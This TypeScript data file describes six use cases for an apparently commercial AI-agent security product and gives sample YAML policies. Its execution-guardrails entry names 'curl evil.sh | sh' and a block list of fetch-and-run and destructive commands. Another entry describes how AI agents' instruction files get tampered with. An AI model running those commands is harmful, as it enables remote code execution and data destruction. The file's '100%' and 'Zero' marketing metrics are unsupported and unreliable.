export interface UseCase {
  slug: string;
  badge: string;
  title: string;
  shortTitle: string;
  description: string;
  shortDescription: string;
  videoSrc: string;
  videoCaption: string;
  iconName: "Eye" | "FileCheck" | "ShieldAlert" | "Lock" | "Shield" | "ClipboardCheck";
  tagType: "logged" | "blocked" | "report";
  tagContent: string;
  commandContent: string;
  metrics: { value: string; label: string }[];
  keyCapabilities: {
    title: string;
    description: string;
    icon: string;
  }[];
  policyExample: {
    filename: string;
    language: string;
    code: string;
  };
  supportedIntegrations: string[];
}

export const useCasesData: Record<string, UseCase> = {
  "session-visibility-oversight": {
    slug: "session-visibility-oversight",
    badge: "USE CASE 01",
    title: "Session Visibility & Oversight",
    shortTitle: "Session Oversight",
    description:
      "See every prompt, session, MCP tool call, and action across browser, CLI, and desktop agents. Real-time and historical audit of all agent surfaces with zero-leak telemetry.",
    shortDescription: "See every prompt, MCP tool call & action across browser, CLI & desktop agents.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Real-time session oversight tracking prompts, MCP tool calls, and agent file reads.",
    iconName: "Eye",
    tagType: "logged",
    tagContent: "LOGGED",
    commandContent: "session → 47 prompts, 12 files read",
    metrics: [
      { value: "100%", label: "Agent Surface Coverage" },
      { value: "< 2ms", label: "Telemetry Overhead" },
      { value: "Zero", label: "Payload Leakage to Third Parties" },
    ],
    keyCapabilities: [
      {
        title: "Omnichannel Session Tracking",
        description: "Monitors agent interactions seamlessly across CLI coding tools, browser automation, and desktop agent runtimes.",
        icon: "Terminal",
      },
      {
        title: "MCP & Tool Call Inspection",
        description: "Inspects Model Context Protocol (MCP) server responses and tool invocations before execution.",
        icon: "Server",
      },
      {
        title: "Historical Telemetry Search",
        description: "Enables instant search across past agent sessions, prompt history, and file access logs.",
        icon: "FileSearch",
      },
      {
        title: "Real-Time Activity Dashboard",
        description: "Provides security teams with live session feeds and immediate notification alerts on risky operations.",
        icon: "Activity",
      },
    ],
    policyExample: {
      filename: "policy-session-oversight.yaml",
      language: "yaml",
      code: `name: session-oversight-policy
version: v1
target:
  agents: ["claude-code", "cursor", "chrome-agent", "mcp-server"]

rules:
  - id: audit-all-agent-prompts
    log_level: VERBOSE
    hash_payloads: true
    store_hashes: true

  - id: monitor-mcp-tool-calls
    inspect: ["arguments", "responses"]
    alert_on_anomaly: true`,
    },
    supportedIntegrations: [
      "Claude Code",
      "Cursor",
      "Codex CLI",
      "Google Chrome",
      "Model Context Protocol (MCP)",
      "LangChain",
    ],
  },

  "content-classification": {
    slug: "content-classification",
    badge: "USE CASE 02",
    title: "Content Classification",
    shortTitle: "Content Classification",
    description:
      "Classify every prompt, document, tool output, and context source before the agent can use it. Block agents from accessing legal, HR, finance, board materials, and source code.",
    shortDescription: "Block agents from accessing legal, HR, finance, board materials & sensitive code.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Dynamic classification blocking unauthorized board memo paste in external LLM.",
    iconName: "FileCheck",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "paste board memo → ChatGPT",
    metrics: [
      { value: "Sub-5ms", label: "Classification Speed" },
      { value: "50+", label: "Built-in Data Classifiers" },
      { value: "100%", label: "Real-Time Context Protection" },
    ],
    keyCapabilities: [
      {
        title: "Automated Sensitive File Detection",
        description: "Automatically scans local files, source code repos, and uploaded documents for PII, API tokens, and internal classification labels.",
        icon: "FileCheck",
      },
      {
        title: "Context Lineage Tracking",
        description: "Maintains sensitivity tags as content moves from file to prompt to model output and tool parameters.",
        icon: "GitBranch",
      },
      {
        title: "Board & Legal Material Shield",
        description: "Prevents agents from reading or summarizing restricted corporate strategy memos and unannounced financial results.",
        icon: "FolderLock",
      },
      {
        title: "Dynamic PII Masking",
        description: "Redacts social security numbers, credit cards, and customer data on the fly before LLM submission.",
        icon: "EyeOff",
      },
    ],
    policyExample: {
      filename: "policy-content-classification.yaml",
      language: "yaml",
      code: `name: content-classification-policy
version: v1
target:
  all_inputs: true

rules:
  - id: restrict-board-materials
    file_pattern: "**/board_memos/**"
    classification: "RESTRICTED_BOARD"
    action: DENY

  - id: mask-pii-before-llm
    detectors: ["ssn", "credit_card", "email"]
    action: MASK`,
    },
    supportedIntegrations: [
      "OpenAI GPT-4o",
      "Claude 3.5 Sonnet",
      "Google Gemini 1.5",
      "Local LLMs / Ollama",
      "Enterprise SaaS",
    ],
  },

  "action-execution-guardrails": {
    slug: "action-execution-guardrails",
    badge: "USE CASE 03",
    title: "Action & Execution Guardrails",
    shortTitle: "Execution Guardrails",
    description:
      "Risk-score and gate shell, git, package, network, cloud, and admin actions. Prevent unsafe downstream actions when suspicious or restricted context is in scope.",
    shortDescription: "Risk-score and gate shell, git, package, cloud & network actions in real time.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Intercepting and blocking malicious subshell command execution (curl evil.sh | sh).",
    iconName: "ShieldAlert",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "curl evil.sh | sh",
    metrics: [
      { value: "0ms", label: "Execution Delay" },
      { value: "Deterministic", label: "Action Authorization" },
      { value: "100%", label: "Malicious Command Blocking" },
    ],
    keyCapabilities: [
      {
        title: "Shell Command Sandboxing",
        description: "Intercepts and risk-scores terminal commands issued by AI agents before they reach the OS kernel.",
        icon: "Terminal",
      },
      {
        title: "Package & Dependency Verification",
        description: "Blocks agents from installing unverified, hallucinated, or malicious npm/pip dependencies.",
        icon: "Lock",
      },
      {
        title: "Cloud Admin Safety Gates",
        description: "Prevents agents from invoking destructive AWS, GCP, or Azure CLI commands (e.g. terminating production databases).",
        icon: "Server",
      },
      {
        title: "Git Push & Commit Verification",
        description: "Ensures AI-generated commits comply with organizational commit signing and security policies.",
        icon: "GitBranch",
      },
    ],
    policyExample: {
      filename: "policy-execution-guardrails.yaml",
      language: "yaml",
      code: `name: execution-guardrail-policy
version: v1
target:
  actions: ["terminal", "git", "cloud_cli"]

rules:
  - id: block-destructive-commands
    patterns:
      - "curl * | sh"
      - "rm -rf /"
      - "aws rds delete-db-instance *"
    action: BLOCK
    notify_security: true`,
    },
    supportedIntegrations: [
      "Claude Code",
      "Cursor Terminal",
      "Codex CLI",
      "AWS CLI / GCP gcloud",
      "npm / pip / cargo",
    ],
  },

  "ai-attacks-defense": {
    slug: "ai-attacks-defense",
    badge: "USE CASE 04",
    title: "AI Attacks & Trust-Surface Defense",
    shortTitle: "AI Attacks Defense",
    description:
      "Detect AI attacks in docs, images, PRs, issues, tool output, emails, and web content. Monitor CLAUDE.md, AGENTS.md, skills, hooks, and local trust files for malicious changes.",
    shortDescription: "Detect prompt injection & monitor CLAUDE.md, AGENTS.md & local trust files.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Blocking unauthorized override attempt on local CLAUDE.md and AGENTS.md instruction files.",
    iconName: "Lock",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "CLAUDE.md → override attempt",
    metrics: [
      { value: "100%", label: "Trust File Tamper Protection" },
      { value: "Sub-10ms", label: "Injection Detection Speed" },
      { value: "Zero-Trust", label: "Instruction Integrity" },
    ],
    keyCapabilities: [
      {
        title: "CLAUDE.md & AGENTS.md Integrity Shield",
        description: "Locks down agent instruction files, preventing untrusted repositories or attackers from modifying agent guidelines.",
        icon: "Lock",
      },
      {
        title: "Indirect Prompt Injection Neutralizer",
        description: "Scans pull requests, GitHub issues, emails, and web pages for hidden instructions designed to trick LLMs.",
        icon: "ShieldAlert",
      },
      {
        title: "Skill & Hook Tamper Detection",
        description: "Monitors local agent skills, custom extensions, and hook configurations for backdoor injections.",
        icon: "Wrench",
      },
      {
        title: "Multimodal Attack Inspection",
        description: "Analyzes images, PDFs, and binary payloads for steganographic or OCR-based prompt injection payloads.",
        icon: "EyeOff",
      },
    ],
    policyExample: {
      filename: "policy-attacks-defense.yaml",
      language: "yaml",
      code: `name: attacks-defense-policy
version: v1
target:
  trust_files: ["CLAUDE.md", "AGENTS.md", ".cursorrules", "skills/**"]

rules:
  - id: lock-instruction-files
    file_path: "**/CLAUDE.md"
    allow_edits_from: "human_developer"
    block_edits_from: "agent_tool"
    action: BLOCK_AND_ALERT`,
    },
    supportedIntegrations: [
      "Claude Code",
      "Cursor (.cursorrules)",
      "GitHub PRs & Issues",
      "OpenAI Assistants",
      "Custom Skills / Agents",
    ],
  },

  "data-loss-prevention": {
    slug: "data-loss-prevention",
    badge: "USE CASE 05",
    title: "Data Loss Prevention (DLP)",
    shortTitle: "Data Loss Prevention",
    description:
      "Prevent sensitive data from leaving through agent-driven channels, not just email and web. Block classified code, credentials, PII, and internal data from reaching Slack, SaaS apps, or external LLMs.",
    shortDescription: "Block classified code, credentials, PII & internal data from reaching external LLMs or Slack.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Detecting and blocking unauthorized customer list transfer to third-party AI service.",
    iconName: "Shield",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "customer_list.csv → Perplexity",
    metrics: [
      { value: "Sub-5ms", label: "DLP Scanning Latency" },
      { value: "Zero", label: "Exfiltration Incidents" },
      { value: "Full", label: "Channel Lineage Tracking" },
    ],
    keyCapabilities: [
      {
        title: "Agent Channel Exfiltration Shield",
        description: "Monitors all outgoing agent communications (Slack, webhooks, SaaS APIs, external LLMs) for unauthorized data transfer.",
        icon: "Shield",
      },
      {
        title: "Source Code & Secret Leak Guard",
        description: "Prevents proprietary source code, private keys, and architecture documents from being sent to external endpoints.",
        icon: "FolderLock",
      },
      {
        title: "Customer PII & Data Masking",
        description: "Enforces automatic masking of names, emails, financial records, and medical data before external transmission.",
        icon: "EyeOff",
      },
      {
        title: "Granular Destination Controls",
        description: "Restricts data movement based on destination domain, recipient endpoint, and sensitivity level.",
        icon: "Globe",
      },
    ],
    policyExample: {
      filename: "policy-dlp.yaml",
      language: "yaml",
      code: `name: agent-dlp-policy
version: v1
target:
  outgoing_channels: ["external_llm", "slack", "webhook"]

rules:
  - id: prevent-csv-exfiltration
    filename_pattern: "*.csv"
    contains: ["customer_id", "email", "phone"]
    action: BLOCK
    alert: "#dlp-alerts"`,
    },
    supportedIntegrations: [
      "Perplexity",
      "ChatGPT / OpenAI API",
      "Anthropic Claude API",
      "Slack / Microsoft Teams",
      "SaaS Webhooks",
    ],
  },

  "audit-compliance-reporting": {
    slug: "audit-compliance-reporting",
    badge: "USE CASE 06",
    title: "Audit & Compliance Reporting",
    shortTitle: "Audit & Compliance",
    description:
      "Generate comprehensive audit trails and compliance reports that demonstrate agent governance in action. Meet SOC 2, ISO 27001, HIPAA, and regulatory requirements with one-click evidence.",
    shortDescription: "One-click compliance reporting for SOC 2, ISO 27001, HIPAA & AI regulations.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Generating SOC 2 & ISO 27001 audit evidence for 847 audited agent sessions.",
    iconName: "ClipboardCheck",
    tagType: "report",
    tagContent: "REPORT",
    commandContent: "847 sessions audited, 100% compliant",
    metrics: [
      { value: "One-click", label: "Audit Report Generation" },
      { value: "100%", label: "SOC 2 & ISO Compliance" },
      { value: "Encrypted", label: "Hash-based Evidence Storage" },
    ],
    keyCapabilities: [
      {
        title: "SOC 2 & ISO 27001 Evidence Automation",
        description: "Automatically collects and formats cryptographic evidence demonstrating agent access controls and data boundaries.",
        icon: "ClipboardCheck",
      },
      {
        title: "Zero-Knowledge Hash Logging",
        description: "Stores cryptographic hashes of session events locally or in your private cloud without exposing raw prompt contents.",
        icon: "Lock",
      },
      {
        title: "SIEM & Data Lake Streaming",
        description: "Streams real-time audit logs directly into Splunk, Datadog, Sumo Logic, or Amazon S3.",
        icon: "Server",
      },
      {
        title: "EU AI Act Compliance",
        description: "Provides pre-packaged compliance frameworks addressing risk management and transparency requirements under the EU AI Act.",
        icon: "FileCheck",
      },
    ],
    policyExample: {
      filename: "policy-audit-compliance.yaml",
      language: "yaml",
      code: `name: compliance-audit-policy
version: v1
target:
  all_sessions: true

rules:
  - id: generate-compliance-trail
    standards: ["SOC2_TYPE_II", "ISO_27001", "HIPAA"]
    hash_algorithm: SHA-256
    destination: "s3://company-compliance-logs"
    retention_days: 365`,
    },
    supportedIntegrations: [
      "Splunk",
      "Datadog",
      "Sumo Logic",
      "Amazon S3",
      "Vanta / Drata",
    ],
  },
};
